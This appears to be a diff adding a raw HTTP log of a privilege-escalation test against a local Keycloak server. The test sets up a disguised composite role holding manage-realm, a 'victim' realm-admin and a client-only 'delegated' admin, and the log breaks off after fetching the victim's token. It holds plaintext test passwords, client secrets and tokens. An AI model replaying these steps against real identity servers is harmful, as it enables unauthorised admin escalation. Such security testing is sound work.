@@ -1,0 +1,259 @@
+--- #1 POST http://127.0.0.1:8080/realms/master/protocol/openid-connect/token
+>>> {"client_id": "admin-cli", "username": "admin", "password": "adminpass", "grant_type": "password"}
+<<< HTTP 200
+{"access_token":"eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICIwWjZmVmJ2U0ZwZHc4Mm5WQURQYVVEX3BJYWZiSWIyWmU1RHNUTC1aSm00In0.eyJleHAiOjE3OTUzNjE0MTMsImlhdCI6MTc5NTM2MTM1MywianRpIjoib25sdHJvOjc2ODdiOWRmLTc1MTYtMDY5My05MDhkLTE3ZGE1NDA5NmU1NCIsImlzcyI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9yZWFsbXMvbWFzdGVyIiwiYXVkIjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL2FkbWluL3JlYWxtcy9tYXN0ZXIiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJhZG1pbi1jbGkiLCJzaWQiOiJ3emF1Zkh5LWNEd2RMWDdqdEtiaXlpNU8iLCJzY29wZSI6ImtjLWFkbWluLWFwaSBlbWFpbCBwcm9maWxlIn0.FEQKKSmmQntrmoHPS6UJ7zXoJOkNbPkYCDRIn2VPNaEKEF1HymvtP6_1q19WW6imQ6GGGiE8wrWGM7sBHnmF7tiX-CzSLNWNgYAUeFsPuZj-3kCxw2jl1kpmo4dRvN1he_GNX6PpVtKTNZzoxY-TUhfDYZ4A9v_pdQbThyot6bWLXhiL-pGXNd9yhQdGINuLahJbhXYo8cUfdaaVZhxT5DLKrnkljLTOqQTuUE2b-aCaZBRwqkGqlsSwPRXpzmTprjzuylBN5rNaTDGm7rOo9gvTGT6bDajgr08mpyyYSbYLScIoiOIibYnTmnF5aqlEyv2orwcefPp-rwKbzkxdWQ","expires_in":60,"refresh_expires_in":1800,"refresh_token":"eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI4NTUyNjMyZS1hZWVkLTQ4NGYtOTQwMS00MzgzYWNiYjI5YzkifQ.eyJleHAiOjE3OTUzNjMxNTMsImlhdCI6MTc5NTM2MTM1MywianRpIjoiNDI5OTA4NDctOWViYi1kMDllLTI2ZGYtMmVhYzlhOTMzNDU1IiwiaXNzIjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL3JlYWxtcy9tYXN0ZXIiLCJhdWQiOiJodHRwOi8vMTI3LjAuMC4xOjgwODAvcmVhbG1zL21hc3RlciIsInR5cCI6IlJlZnJlc2giLCJhenAiOiJhZG1pbi1jbGkiLCJzaWQiOiJ3emF1Zkh5LWNEd2RMWDdqdEtiaXlpNU8iLCJzY29wZSI6ImFjciBiYXNpYyBrYy1hZG1pbi1hcGkgcm9sZXMgZW1haWwgd2ViLW9yaWdpbnMgcHJvZmlsZSIsImF1ZF94IjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL2FkbWluL3JlYWxtcy9tYXN0ZXIiLCJwcm92IjoiZGVmY...[truncated]
+
+--- #2 POST http://127.0.0.1:8080/admin/realms
+>>> {"realm": "k1fgap1", "enabled": true, "adminPermissionsEnabled": true}
+<<< HTTP 201
+
+
+--- #3 GET http://127.0.0.1:8080/admin/realms/k1fgap1
+>>> 
+<<< HTTP 200
+{"id":"8044c0ed-31bd-487b-927c-5a11e936f8c9","realm":"k1fgap1","notBefore":0,"defaultSignatureAlgorithm":"RS256","revokeRefreshToken":false,"refreshTokenMaxReuse":0,"accessTokenLifespan":300,"accessTokenLifespanForImplicitFlow":900,"ssoSessionIdleTimeout":1800,"ssoSessionMaxLifespan":36000,"ssoSessionIdleTimeoutRememberMe":0,"ssoSessionMaxLifespanRememberMe":0,"offlineSessionIdleTimeout":2592000,"offlineSessionMaxLifespanEnabled":false,"offlineSessionMaxLifespan":5184000,"clientSessionIdleTimeout":0,"clientSessionMaxLifespan":0,"clientOfflineSessionIdleTimeout":0,"clientOfflineSessionMaxLifespan":0,"accessCodeLifespan":60,"accessCodeLifespanUserAction":300,"accessCodeLifespanLogin":1800,"actionTokenGeneratedByAdminLifespan":43200,"actionTokenGeneratedByUserLifespan":300,"oauth2DeviceCodeLifespan":600,"oauth2DevicePollingInterval":5,"enabled":true,"sslRequired":"external","registrationAllowed":false,"registrationEmailAsUsername":false,"rememberMe":false,"verifyEmail":false,"loginWithEmailAllowed":true,"duplicateEmailsAllowed":false,"resetPasswordAllowed":false,"editUsernameAllowed":false,"bruteForceProtected":false,"permanentLockout":false,"maxTemporaryLockouts":0,"bruteForceStrategy":"MULTIPLE","maxFailureWaitSeconds":900,"minimumQuickLoginWaitSeconds":60,"waitIncrementSeconds":60,"quickLoginCheckMilliSeconds":1000,"maxDeltaTimeSeconds":43200,"failureFactor":30,"maxSecondaryAuthFailures":0,"defaultRole":{"id":"dee503ee-89a6-457d-bdfa-f6f0d866baaa","name":"default-roles-k1fgap...[truncated]
+
+--- #4 GET http://127.0.0.1:8080/admin/realms/k1fgap1/clients?clientId=admin-permissions
+>>> 
+<<< HTTP 200
+[{"id":"4efb3ec3-c757-4d57-8a1c-8e4a2a37d887","clientId":"admin-permissions","surrogateAuthRequired":false,"enabled":true,"alwaysDisplayInConsole":false,"redirectUris":[],"webOrigins":[],"notBefore":0,"bearerOnly":false,"consentRequired":false,"standardFlowEnabled":true,"implicitFlowEnabled":false,"directAccessGrantsEnabled":false,"serviceAccountsEnabled":true,"authorizationServicesEnabled":true,"publicClient":false,"frontchannelLogout":false,"protocol":"openid-connect","attributes":{"realm_client":"false"},"authenticationFlowBindingOverrides":{},"fullScopeAllowed":false,"nodeReRegistrationTimeout":0,"defaultClientScopes":["web-origins","acr","roles","profile","basic","email"],"optionalClientScopes":["address","phone","offline_access","organization","microprofile-jwt"],"access":{"view":true,"configure":false,"manage":false}}]
+
+--- #5 GET http://127.0.0.1:8080/admin/realms/k1fgap1/clients/4efb3ec3-c757-4d57-8a1c-8e4a2a37d887/authz/resource-server/resource
+>>> 
+<<< HTTP 200
+[{"name":"Clients","type":"Clients","owner":{"id":"4efb3ec3-c757-4d57-8a1c-8e4a2a37d887","name":"admin-permissions"},"ownerManagedAccess":false,"attributes":{},"_id":"8dfd7c12-f816-43c2-ae8e-57dcf243b02d","uris":[],"scopes":[{"id":"8f27b64f-aede-4028-9c1d-444874d79103","name":"view"},{"id":"f1a00d0b-2f27-4894-9c21-fb6fec68969d","name":"map-roles-client-scope"},{"id":"80d33276-57d2-410f-896d-1437c6b68923","name":"map-roles"},{"id":"415f9d2f-79ba-4574-a507-4b01d9bc8de1","name":"manage"},{"id":"0e5030d4-5ef0-4d70-a1d8-de2a7903f311","name":"map-roles-composite"}]},{"name":"Groups","type":"Groups","owner":{"id":"4efb3ec3-c757-4d57-8a1c-8e4a2a37d887","name":"admin-permissions"},"ownerManagedAccess":false,"attributes":{},"_id":"9d530aed-e257-4d5c-9520-16e8a0569100","uris":[],"scopes":[{"id":"6f5db68f-ba51-486e-beaa-907cb48039ab","name":"manage-members"},{"id":"8f27b64f-aede-4028-9c1d-444874d79103","name":"view"},{"id":"fc226cab-1502-488a-8820-62058351848b","name":"manage-membership-of-members"},{"id":"6f61208a-b11d-4db0-aa8e-8aab13d95e39","name":"manage-membership"},{"id":"20b04a56-dd1a-4b3d-b6f5-56f1f96ad5fa","name":"delegate-members"},{"id":"0e60fe09-aaea-476f-8e4a-cb66a141cd7f","name":"view-members"},{"id":"415f9d2f-79ba-4574-a507-4b01d9bc8de1","name":"manage"},{"id":"e97d5afb-6e7b-4676-aba2-aea22168bb02","name":"impersonate-members"}]},{"name":"Organizations","type":"Organizations","owner":{"id":"4efb3ec3-c757-4d57-8a1c-8e4a2a37d887","name":"admin-permissions"},"ownerManagedAcce...[truncated]
+
+--- #6 GET http://127.0.0.1:8080/admin/realms/k1fgap1/clients/4efb3ec3-c757-4d57-8a1c-8e4a2a37d887/authz/resource-server/scope
+>>> 
+<<< HTTP 200
+[{"id":"026309e1-571c-401e-a2df-5ee84f35cdfd","name":"delegate"},{"id":"20b04a56-dd1a-4b3d-b6f5-56f1f96ad5fa","name":"delegate-members"},{"id":"68be44d3-67b8-49ec-895e-caa22d58f7b3","name":"impersonate"},{"id":"e97d5afb-6e7b-4676-aba2-aea22168bb02","name":"impersonate-members"},{"id":"415f9d2f-79ba-4574-a507-4b01d9bc8de1","name":"manage"},{"id":"9967fbdd-b726-4b6e-907b-82c11877f887","name":"manage-group-membership"},{"id":"6f5db68f-ba51-486e-beaa-907cb48039ab","name":"manage-members"},{"id":"6f61208a-b11d-4db0-aa8e-8aab13d95e39","name":"manage-membership"},{"id":"fc226cab-1502-488a-8820-62058351848b","name":"manage-membership-of-members"},{"id":"40ca48d7-83df-41ba-a964-b02932219be6","name":"map-role"},{"id":"f24bfe01-b99c-42f3-8195-0cf8d263c2cb","name":"map-role-client-scope"},{"id":"10c32883-dc88-46bc-a3f8-95f88dd7d157","name":"map-role-composite"},{"id":"80d33276-57d2-410f-896d-1437c6b68923","name":"map-roles"},{"id":"f1a00d0b-2f27-4894-9c21-fb6fec68969d","name":"map-roles-client-scope"},{"id":"0e5030d4-5ef0-4d70-a1d8-de2a7903f311","name":"map-roles-composite"},{"id":"c44753ff-425b-4f7e-8352-b44e4ed380ea","name":"reset-password"},{"id":"8f27b64f-aede-4028-9c1d-444874d79103","name":"view"},{"id":"0e60fe09-aaea-476f-8e4a-cb66a141cd7f","name":"view-members"}]
+
+--- #7 GET http://127.0.0.1:8080/admin/realms/k1fgap1/clients?clientId=realm-management
+>>> 
+<<< HTTP 200
+[{"id":"315e44f0-14cc-4c7d-92f5-07897ba0b675","clientId":"realm-management","name":"${client_realm-management}","surrogateAuthRequired":false,"enabled":true,"alwaysDisplayInConsole":false,"clientAuthenticatorType":"client-secret","redirectUris":[],"webOrigins":[],"notBefore":0,"bearerOnly":true,"consentRequired":false,"standardFlowEnabled":true,"implicitFlowEnabled":false,"directAccessGrantsEnabled":false,"serviceAccountsEnabled":false,"publicClient":false,"frontchannelLogout":false,"protocol":"openid-connect","attributes":{"realm_client":"true"},"authenticationFlowBindingOverrides":{},"fullScopeAllowed":false,"nodeReRegistrationTimeout":0,"defaultClientScopes":["web-origins","acr","roles","profile","basic","email"],"optionalClientScopes":["address","phone","offline_access","organization","microprofile-jwt"],"access":{"view":true,"configure":false,"manage":false}}]
+
+--- #8 GET http://127.0.0.1:8080/admin/realms/k1fgap1/clients/315e44f0-14cc-4c7d-92f5-07897ba0b675/roles/realm-admin
+>>> 
+<<< HTTP 200
+{"id":"f7d80c0c-be98-4cbd-a074-80a58b759e1d","name":"realm-admin","description":"${role_realm-admin}","composite":true,"clientRole":true,"containerId":"315e44f0-14cc-4c7d-92f5-07897ba0b675","attributes":{}}
+
+--- #9 GET http://127.0.0.1:8080/admin/realms/k1fgap1/clients/315e44f0-14cc-4c7d-92f5-07897ba0b675/roles/manage-realm
+>>> 
+<<< HTTP 200
+{"id":"e86053c5-5776-437d-9a5f-ecfba7e6cdc7","name":"manage-realm","description":"${role_manage-realm}","composite":false,"clientRole":true,"containerId":"315e44f0-14cc-4c7d-92f5-07897ba0b675","attributes":{}}
+
+--- #10 POST http://127.0.0.1:8080/admin/realms/k1fgap1/roles
+>>> {"name": "app-user"}
+<<< HTTP 201
+
+
+--- #11 GET http://127.0.0.1:8080/admin/realms/k1fgap1/roles/app-user
+>>> 
+<<< HTTP 200
+{"id":"c8b8169b-036e-4aba-883a-e00aea2d3968","name":"app-user","composite":false,"clientRole":false,"containerId":"8044c0ed-31bd-487b-927c-5a11e936f8c9","attributes":{}}
+
+--- #12 POST http://127.0.0.1:8080/admin/realms/k1fgap1/roles
+>>> {"name": "plain-role"}
+<<< HTTP 201
+
+
+--- #13 GET http://127.0.0.1:8080/admin/realms/k1fgap1/roles/plain-role
+>>> 
+<<< HTTP 200
+{"id":"049d38e6-a4a5-4798-ba58-35a6b0f8947c","name":"plain-role","composite":false,"clientRole":false,"containerId":"8044c0ed-31bd-487b-927c-5a11e936f8c9","attributes":{}}
+
+--- #14 POST http://127.0.0.1:8080/admin/realms/k1fgap1/roles
+>>> {"name": "innocent-bundle"}
+<<< HTTP 201
+
+
+--- #15 GET http://127.0.0.1:8080/admin/realms/k1fgap1/roles/innocent-bundle
+>>> 
+<<< HTTP 200
+{"id":"511ee8a5-c5c2-46e5-b67c-9418626fad7d","name":"innocent-bundle","composite":false,"clientRole":false,"containerId":"8044c0ed-31bd-487b-927c-5a11e936f8c9","attributes":{}}
+
+--- #16 POST http://127.0.0.1:8080/admin/realms/k1fgap1/roles/innocent-bundle/composites
+>>> [{"id": "e86053c5-5776-437d-9a5f-ecfba7e6cdc7", "name": "manage-realm"}]
+<<< HTTP 204
+
+
+--- #17 POST http://127.0.0.1:8080/admin/realms/k1fgap1/clients
+>>> {"clientId": "portal", "enabled": true, "publicClient": false, "secret": "portal-secret", "directAccessGrantsEnabled": true, "standardFlowEnabled": true, "fullScopeAllowed": false}
+<<< HTTP 201
+
+
+--- #18 GET http://127.0.0.1:8080/admin/realms/k1fgap1/clients?clientId=portal
+>>> 
+<<< HTTP 200
+[{"id":"99152e65-f88c-4d19-a0b4-610ee74d3df8","clientId":"portal","surrogateAuthRequired":false,"enabled":true,"alwaysDisplayInConsole":false,"clientAuthenticatorType":"client-secret","secret":"portal-secret","redirectUris":[],"webOrigins":[],"notBefore":0,"bearerOnly":false,"consentRequired":false,"standardFlowEnabled":true,"implicitFlowEnabled":false,"directAccessGrantsEnabled":true,"serviceAccountsEnabled":false,"publicClient":false,"frontchannelLogout":false,"protocol":"openid-connect","attributes":{"realm_client":"false"},"authenticationFlowBindingOverrides":{},"fullScopeAllowed":false,"nodeReRegistrationTimeout":-1,"defaultClientScopes":["web-origins","acr","roles","profile","basic","email"],"optionalClientScopes":["address","phone","offline_access","organization","microprofile-jwt"],"access":{"view":true,"configure":true,"manage":true}}]
+
+--- #19 POST http://127.0.0.1:8080/admin/realms/k1fgap1/clients/99152e65-f88c-4d19-a0b4-610ee74d3df8/scope-mappings/realm
+>>> [{"id": "c8b8169b-036e-4aba-883a-e00aea2d3968", "name": "app-user"}]
+<<< HTTP 204
+
+
+--- #20 POST http://127.0.0.1:8080/admin/realms/k1fgap1/clients
+>>> {"clientId": "portal2", "enabled": true, "publicClient": false, "secret": "portal-secret", "directAccessGrantsEnabled": true, "standardFlowEnabled": true, "fullScopeAllowed": false}
+<<< HTTP 201
+
+
+--- #21 GET http://127.0.0.1:8080/admin/realms/k1fgap1/clients?clientId=portal2
+>>> 
+<<< HTTP 200
+[{"id":"d267ea4d-a76d-4868-a40e-0d3018fba52c","clientId":"portal2","surrogateAuthRequired":false,"enabled":true,"alwaysDisplayInConsole":false,"clientAuthenticatorType":"client-secret","secret":"portal-secret","redirectUris":[],"webOrigins":[],"notBefore":0,"bearerOnly":false,"consentRequired":false,"standardFlowEnabled":true,"implicitFlowEnabled":false,"directAccessGrantsEnabled":true,"serviceAccountsEnabled":false,"publicClient":false,"frontchannelLogout":false,"protocol":"openid-connect","attributes":{"realm_client":"false"},"authenticationFlowBindingOverrides":{},"fullScopeAllowed":false,"nodeReRegistrationTimeout":-1,"defaultClientScopes":["web-origins","acr","roles","profile","basic","email"],"optionalClientScopes":["address","phone","offline_access","organization","microprofile-jwt"],"access":{"view":true,"configure":true,"manage":true}}]
+
+--- #22 POST http://127.0.0.1:8080/admin/realms/k1fgap1/clients/d267ea4d-a76d-4868-a40e-0d3018fba52c/scope-mappings/realm
+>>> [{"id": "c8b8169b-036e-4aba-883a-e00aea2d3968", "name": "app-user"}]
+<<< HTTP 204
+
+
+--- #23 POST http://127.0.0.1:8080/admin/realms/k1fgap1/clients
+>>> {"clientId": "deleg-app", "enabled": true}
+<<< HTTP 201
+
+
+--- #24 GET http://127.0.0.1:8080/admin/realms/k1fgap1/clients?clientId=deleg-app
+>>> 
+<<< HTTP 200
+[{"id":"57fa91e9-596e-41b2-8a6c-7806374da6e8","clientId":"deleg-app","surrogateAuthRequired":false,"enabled":true,"alwaysDisplayInConsole":false,"clientAuthenticatorType":"client-secret","secret":"cYpTj9pYoYvzd48vJjNUDKiVWRpuqwweCsIhe8i0kiks7INPrs6FRFz55yT9SkjyV8rKRRTQZRtSotpX2zQvsd","redirectUris":[],"webOrigins":[],"notBefore":0,"bearerOnly":false,"consentRequired":false,"standardFlowEnabled":true,"implicitFlowEnabled":false,"directAccessGrantsEnabled":false,"serviceAccountsEnabled":false,"publicClient":false,"frontchannelLogout":false,"protocol":"openid-connect","attributes":{"realm_client":"false","client.secret.creation.time":"1795361357"},"authenticationFlowBindingOverrides":{},"fullScopeAllowed":true,"nodeReRegistrationTimeout":-1,"defaultClientScopes":["web-origins","acr","roles","profile","basic","email"],"optionalClientScopes":["address","phone","offline_access","organization","microprofile-jwt"],"access":{"view":true,"configure":true,"manage":true}}]
+
+--- #25 POST http://127.0.0.1:8080/admin/realms/k1fgap1/clients/57fa91e9-596e-41b2-8a6c-7806374da6e8/roles
+>>> {"name": "deleg-role"}
+<<< HTTP 201
+
+
+--- #26 GET http://127.0.0.1:8080/admin/realms/k1fgap1/client-scopes
+>>> 
+<<< HTTP 200
+[{"id":"b0d5f60d-978f-499e-b01a-f254d00a23b7","name":"offline_access","description":"OpenID Connect built-in scope: offline_access","protocol":"openid-connect","attributes":{"consent.screen.text":"${offlineAccessScopeConsentText}","display.on.consent.screen":"true"}},{"id":"894a6f86-2238-40dc-9115-ad52f706646a","name":"phone","description":"OpenID Connect built-in scope: phone","protocol":"openid-connect","attributes":{"include.in.token.scope":"true","consent.screen.text":"${phoneScopeConsentText}","display.on.consent.screen":"true"},"protocolMappers":[{"id":"0592c788-6d63-49d5-9d6c-fe03e36611ec","name":"phone number","protocol":"openid-connect","protocolMapper":"oidc-usermodel-attribute-mapper","consentRequired":false,"config":{"introspection.token.claim":"true","userinfo.token.claim":"true","user.attribute":"phoneNumber","id.token.claim":"true","access.token.claim":"true","claim.name":"phone_number","jsonType.label":"String"}},{"id":"d768f746-7060-4e11-a286-fff2a3bbe02b","name":"phone number verified","protocol":"openid-connect","protocolMapper":"oidc-usermodel-attribute-mapper","consentRequired":false,"config":{"introspection.token.claim":"true","userinfo.token.claim":"true","user.attribute":"phoneNumberVerified","id.token.claim":"true","access.token.claim":"true","claim.name":"phone_number_verified","jsonType.label":"boolean"}}]},{"id":"55758fc1-4c3f-434d-9f86-9f764f85dd6b","name":"AuthnContextClassRef","description":"AuthnContextClassRef Level of Authentiation","protocol...[truncated]
+
+--- #27 POST http://127.0.0.1:8080/admin/realms/k1fgap1/users
+>>> {"username": "victim", "enabled": true, "email": "victim@example.local", "emailVerified": true, "firstName": "victim", "lastName": "Test", "credentials": [{"type": "password", "value": "victimpass", "temporary": false}]}
+<<< HTTP 201
+
+
+--- #28 GET http://127.0.0.1:8080/admin/realms/k1fgap1/users?username=victim
+>>> 
+<<< HTTP 200
+[{"id":"7d75f5bb-e72e-479e-8be3-e67d1c897d12","username":"victim","firstName":"victim","lastName":"Test","email":"victim@example.local","emailVerified":true,"enabled":true,"createdTimestamp":1795361357461,"totp":false,"disableableCredentialTypes":[],"requiredActions":[],"notBefore":0,"access":{"manage":true}}]
+
+--- #29 POST http://127.0.0.1:8080/admin/realms/k1fgap1/users/7d75f5bb-e72e-479e-8be3-e67d1c897d12/role-mappings/clients/315e44f0-14cc-4c7d-92f5-07897ba0b675
+>>> [{"id": "f7d80c0c-be98-4cbd-a074-80a58b759e1d", "name": "realm-admin"}]
+<<< HTTP 204
+
+
+--- #30 POST http://127.0.0.1:8080/admin/realms/k1fgap1/users
+>>> {"username": "delegated", "enabled": true, "email": "delegated@example.local", "emailVerified": true, "firstName": "delegated", "lastName": "Test", "credentials": [{"type": "password", "value": "delegpass", "temporary": false}]}
+<<< HTTP 201
+
+
+--- #31 GET http://127.0.0.1:8080/admin/realms/k1fgap1/users?username=delegated
+>>> 
+<<< HTTP 200
+[{"id":"1ed057b6-0d12-4409-8239-1582bf505ce1","username":"delegated","firstName":"delegated","lastName":"Test","email":"delegated@example.local","emailVerified":true,"enabled":true,"createdTimestamp":1795361357746,"totp":false,"disableableCredentialTypes":[],"requiredActions":[],"notBefore":0,"access":{"manage":true}}]
+
+--- #32 GET http://127.0.0.1:8080/admin/realms/k1fgap1/users/1ed057b6-0d12-4409-8239-1582bf505ce1/role-mappings/clients/315e44f0-14cc-4c7d-92f5-07897ba0b675
+>>> 
+<<< HTTP 200
+[]
+
+--- #33 GET http://127.0.0.1:8080/admin/realms/k1fgap1/users/1ed057b6-0d12-4409-8239-1582bf505ce1/role-mappings/realm
+>>> 
+<<< HTTP 200
+[{"id":"dee503ee-89a6-457d-bdfa-f6f0d866baaa","name":"default-roles-k1fgap1","description":"${role_default-roles}","composite":true,"clientRole":false,"containerId":"8044c0ed-31bd-487b-927c-5a11e936f8c9"}]
+
+--- #34 POST http://127.0.0.1:8080/admin/realms/k1fgap1/clients/4efb3ec3-c757-4d57-8a1c-8e4a2a37d887/authz/resource-server/policy/user
+>>> {"name": "delegated-admin-user-policy", "description": "FGAP user policy for user 'delegated'", "logic": "POSITIVE", "users": ["1ed057b6-0d12-4409-8239-1582bf505ce1"]}
+<<< HTTP 201
+{"id":"4218ec70-97ba-4cc4-81a4-d3b8f6fd7f21","name":"delegated-admin-user-policy","description":"FGAP user policy for user 'delegated'","type":"user","logic":"POSITIVE","decisionStrategy":"UNANIMOUS","users":["1ed057b6-0d12-4409-8239-1582bf505ce1"]}
+
+--- #35 POST http://127.0.0.1:8080/admin/realms/k1fgap1/clients/4efb3ec3-c757-4d57-8a1c-8e4a2a37d887/authz/resource-server/policy/scope
+>>> {"name": "delegated-manage-clients", "description": "FGAP delegation: manage clients only", "logic": "POSITIVE", "decisionStrategy": "UNANIMOUS", "resourceType": "Clients", "resources": ["8dfd7c12-f816-43c2-ae8e-57dcf243b02d"], "scopes": ["8f27b64f-aede-4028-9c1d-444874d79103", "415f9d2f-79ba-4574-a507-4b01d9bc8de1", "80d33276-57d2-410f-896d-1437c6b68923", "f1a00d0b-2f27-4894-9c21-fb6fec68969d", "0e5030d4-5ef0-4d70-a1d8-de2a7903f311"], "policies": ["4218ec70-97ba-4cc4-81a4-d3b8f6fd7f21"]}
+<<< HTTP 201
+{"id":"63cced85-ad8c-448a-9423-cea617c7466d","name":"delegated-manage-clients","description":"FGAP delegation: manage clients only","type":"scope","policies":["4218ec70-97ba-4cc4-81a4-d3b8f6fd7f21"],"resources":["8dfd7c12-f816-43c2-ae8e-57dcf243b02d"],"scopes":["0e5030d4-5ef0-4d70-a1d8-de2a7903f311","8f27b64f-aede-4028-9c1d-444874d79103","415f9d2f-79ba-4574-a507-4b01d9bc8de1","f1a00d0b-2f27-4894-9c21-fb6fec68969d","80d33276-57d2-410f-896d-1437c6b68923"],"logic":"POSITIVE","decisionStrategy":"UNANIMOUS","resourceType":"Clients"}
+
+--- #36 POST http://127.0.0.1:8080/realms/k1fgap1/protocol/openid-connect/token
+>>> {"client_id": "admin-cli", "username": "delegated", "password": "delegpass", "grant_type": "password"}
+<<< HTTP 200
+{"access_token":"eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJicmFLb3JXWHpIZmtXczE5NkQtakRLWFpwUjFuRUlPOWZsRUE1MC12akxvIn0.eyJleHAiOjE3OTUzNjE2NTgsImlhdCI6MTc5NTM2MTM1OCwianRpIjoib25sdHJvOjZiMDg2NzU0LTcyYTQtYzQ1YS0yZDVkLWMxMjk3NjhiMWRhYSIsImlzcyI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9yZWFsbXMvazFmZ2FwMSIsImF1ZCI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9hZG1pbi9yZWFsbXMvazFmZ2FwMSIsInR5cCI6IkJlYXJlciIsImF6cCI6ImFkbWluLWNsaSIsInNpZCI6ImRxQllTR0JzRXNpdXBsbTJyaFBMbnN6ciIsInNjb3BlIjoia2MtYWRtaW4tYXBpIHByb2ZpbGUgZW1haWwifQ.d1q9AebW0KzjHFm7Uorl3RVoXN8YxrF_8gj1nZORPAeziJhmOvpLbI3nqA3uXUUoTequcgxaFN6T-afSp6tmmvSHRuV8UM_e1ueAbBNd6eUy-fqwYuN7SyjyrhtGHP7S5lB2DWcZj1maacAzlLYX5UcSVAiRn7b7cz-shdEdO_bdPNEeFvLH6N6z2F_AfgCJ_HKQLLFjQXS13JL7X7oa6s-sQKWw01FtWucKSILfPvw_5JnsOrW_mp69EokonxmqbMoOkU6gIJwiBZs5qkcHOm_4e_bDbL1_LzO7sYQT_-H6Grg-aTHf2CnqE7YP0VAdlxrNRQlES8csKQf_6pJOww","expires_in":300,"refresh_expires_in":1800,"refresh_token":"eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI0Njc2NjEwNC0zZjVjLTQ3YjgtOWJkYS1hNzRkZmM4MTgyZmIifQ.eyJleHAiOjE3OTUzNjMxNTgsImlhdCI6MTc5NTM2MTM1OCwianRpIjoiYWYzNmZlNTctYWNjYy0zNTYxLTQ4NGYtNmZjYmMyMzdhNTY2IiwiaXNzIjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL3JlYWxtcy9rMWZnYXAxIiwiYXVkIjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL3JlYWxtcy9rMWZnYXAxIiwidHlwIjoiUmVmcmVzaCIsImF6cCI6ImFkbWluLWNsaSIsInNpZCI6ImRxQllTR0JzRXNpdXBsbTJyaFBMbnN6ciIsInNjb3BlIjoiYmFzaWMgcm9sZXMgd2ViLW9yaWdpbnMga2MtYWRtaW4tYXBpIHByb2ZpbGUgZW1haWwgYWNyIiwiYXVkX3giOiJodHRwOi8vMTI3LjAuMC4xOjgwODAvYWRtaW4vcmVhbG1zL2sxZmdhcDEiLCJwcm92I...[truncated]
+
+--- #37 GET http://127.0.0.1:8080/admin/realms/k1fgap1/clients
+>>> 
+<<< HTTP 200
+[{"id":"6a61554d-2e51-4ba7-ad06-3be9dc2e3d7a","clientId":"account","name":"${client_account}","rootUrl":"${authBaseUrl}","baseUrl":"/realms/k1fgap1/account/","surrogateAuthRequired":false,"enabled":true,"alwaysDisplayInConsole":false,"clientAuthenticatorType":"client-secret","redirectUris":["/realms/k1fgap1/account/*"],"webOrigins":[],"notBefore":0,"bearerOnly":false,"consentRequired":false,"standardFlowEnabled":true,"implicitFlowEnabled":false,"directAccessGrantsEnabled":false,"serviceAccountsEnabled":false,"publicClient":true,"frontchannelLogout":false,"protocol":"openid-connect","attributes":{"realm_client":"false","post.logout.redirect.uris":"+"},"authenticationFlowBindingOverrides":{},"fullScopeAllowed":false,"nodeReRegistrationTimeout":0,"defaultClientScopes":["web-origins","acr","roles","profile","basic","email"],"optionalClientScopes":["address","phone","offline_access","organization","microprofile-jwt"],"access":{"view":true,"configure":true,"manage":true}},{"id":"65125ccb-2e00-4f43-a794-94a723cdbbda","clientId":"account-console","name":"${client_account-console}","rootUrl":"${authBaseUrl}","baseUrl":"/realms/k1fgap1/account/","surrogateAuthRequired":false,"enabled":true,"alwaysDisplayInConsole":false,"clientAuthenticatorType":"client-secret","redirectUris":["/realms/k1fgap1/account/*"],"webOrigins":[],"notBefore":0,"bearerOnly":false,"consentRequired":false,"standardFlowEnabled":true,"implicitFlowEnabled":false,"directAccessGrantsEnabled":false,"serviceAccountsEnabl...[truncated]
+
+--- #38 GET http://127.0.0.1:8080/admin/realms/k1fgap1/users
+>>> 
+<<< HTTP 403
+{"error":"HTTP 403 Forbidden"}
+
+--- #39 GET http://127.0.0.1:8080/admin/realms/k1fgap1
+>>> 
+<<< HTTP 403
+{"error":"HTTP 403 Forbidden"}
+
+--- #40 POST http://127.0.0.1:8080/realms/k1fgap1/protocol/openid-connect/token
+>>> {"client_id": "portal", "username": "victim", "password": "victimpass", "grant_type": "password", "client_secret": "portal-secret"}
+<<< HTTP 200
+{"access_token":"eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJicmFLb3JXWHpIZmtXczE5NkQtakRLWFpwUjFuRUlPOWZsRUE1MC12akxvIn0.eyJleHAiOjE3OTUzNjE2NTgsImlhdCI6MTc5NTM2MTM1OCwianRpIjoib25ydHJvOjI2YWEzNWQzLWY1NGItYjJjYi1jZmY1LWZiNWE1YjE5OWFlMSIsImlzcyI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9yZWFsbXMvazFmZ2FwMSIsInN1YiI6IjdkNzVmNWJiLWU3MmUtNDc5ZS04YmUzLWU2N2QxYzg5N2QxMiIsInR5cCI6IkJlYXJlciIsImF6cCI6InBvcnRhbCIsInNpZCI6IkJJd244SHZzTGU2aGluVG5XcHByNk1MSCIsImFjciI6IjEiLCJzY29wZSI6InByb2ZpbGUgZW1haWwiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwibmFtZSI6InZpY3RpbSBUZXN0IiwicHJlZmVycmVkX3VzZXJuYW1lIjoidmljdGltIiwiZ2l2ZW5fbmFtZSI6InZpY3RpbSIsImZhbWlseV9uYW1lIjoiVGVzdCIsImVtYWlsIjoidmljdGltQGV4YW1wbGUubG9jYWwifQ.jsVIx-0ZTb2NeBuJ5HdNsmdMVzIW8UkvRYlgqtZWO0tOni4J-7RLn6PUfBquOUpzsA_nCyNqjhX2q-LCevMGTWb41PPodvZhc-GYpJxSrShDeCvQwQhg_y6qWTvMau2NSZRzoHBndmLeiuYaw013Lt4OuTulRPBj0DVrBn4qV9F658bHaAZJ1Uttvd-WHELunSnnUre_rM3jhL-98bAen5hcpe-JZLz_ZvXHAvqi4LtrZdZzSBfvXnB9Sbo3ecMAGpTWCX9ikUco